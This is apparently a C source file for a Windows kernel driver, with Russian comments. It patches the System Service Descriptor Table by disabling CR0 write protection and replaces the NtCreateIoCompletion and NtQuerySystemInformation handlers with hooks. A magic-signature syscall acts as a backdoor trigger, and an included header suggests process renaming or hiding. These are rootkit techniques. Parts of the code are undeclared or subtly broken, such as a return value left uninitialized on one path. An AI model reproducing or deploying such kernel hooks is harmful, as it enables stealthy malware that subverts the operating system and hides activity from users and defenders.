#include <ntddk.h>
#include "cr0.h"
#include "rename_proc.h"

typedef struct _KSERVICE_TABLE_DESCRIPTOR {
    PULONG_PTR Base;        // массив адресов системных вызовов(сервисов)
    PULONG Count;           // массив счётчиков вызовов сервисов
    ULONG Limit;            // количество вызовов в таблице
    PUCHAR Number;          // массив количества параметров вызовов(в байтах)
} KSERVICE_TABLE_DESCRIPTOR, * PKSERVICE_TABLE_DESCRIPTOR;


typedef NTSTATUS (*NT_CREATE_IO_COMPLETION)(
    ULONG_PTR	arg_01,
    ULONG_PTR	arg_02,
    ULONG_PTR	arg_03,
    ULONG_PTR	arg_04
);

#define NUMBER_NT_CREATE_IO_COMPLETION  0x26 //38
#define SYSCALL_SIGNATURE  0xBAD0FACE

NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp);
VOID DriverUnload(IN PDRIVER_OBJECT dob);

ULONG_PTR HookNtCreateIoCompletion(
    ULONG_PTR	arg_01,
    ULONG_PTR	arg_02,
    ULONG_PTR	arg_03,
    ULONG_PTR	arg_04
);

NT_CREATE_IO_COMPLETION glRealNtCreateIoCompletion;
extern PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable;


NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {

    ULONG reg;

#if DBG
    DbgPrint("Load driver %wZ\n", &dob->DriverName);
    DbgPrint("Registry path %wZ\n", rgp);
#endif

    glRealNtCreateIoCompletion = (NT_CREATE_IO_COMPLETION)KeServiceDescriptorTable->Base[NUMBER_NT_CREATE_IO_COMPLETION];
    glRealNtQuerySystemInformation = (NT_QUERY_SYSTEM_INFORMATION)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION];

    reg = ClearWP();
    KeServiceDescriptorTable->Base[NUMBER_NT_CREATE_IO_COMPLETION] = (ULONG)HookNtCreateIoCompletion;
    WriteCR0(reg);

    reg = ClearWP();
    KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION] = (ULONG)HookNtQuerySystemInformation;
    WriteCR0(reg);

    dob->DriverUnload = DriverUnload;


    return STATUS_SUCCESS;
}

VOID DriverUnload(IN PDRIVER_OBJECT dob) {

    ULONG reg;

#if DBG
    DbgPrint("Driver unload\n");
#endif

    reg = ClearWP();
    KeServiceDescriptorTable->Base[NUMBER_NT_CREATE_IO_COMPLETION] = (ULONG)glRealNtCreateIoCompletion;
    WriteCR0(reg);

    reg = ClearWP();
    KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION] = (ULONG)glRealNtQuerySystemInformation;
    WriteCR0(reg);

    return;
}



ULONG_PTR HookNtCreateIoCompletion(
    ULONG_PTR	arg_01,
    ULONG_PTR	arg_02,
    ULONG_PTR	arg_03,
    ULONG_PTR	arg_04)
{
    NTSTATUS retStatus;
    
    if ((ULONG)arg_01 == (ULONG)SYSCALL_SIGNATURE) {
        DbgPrint("COOOOOOOOOOOOOOOOOOL\n");
    }
    else {
        retStatus = glRealNtCreateIoCompletion(
            arg_01,
            arg_02,
            arg_03,
            arg_04
        );

        DbgPrint("arg_01 0x%08X\narg_02 0x%08X\narg_03 0x%08X\narg_04 0x%08X\n",
            arg_01, arg_02, arg_03, arg_04);
    }

    return retStatus;
}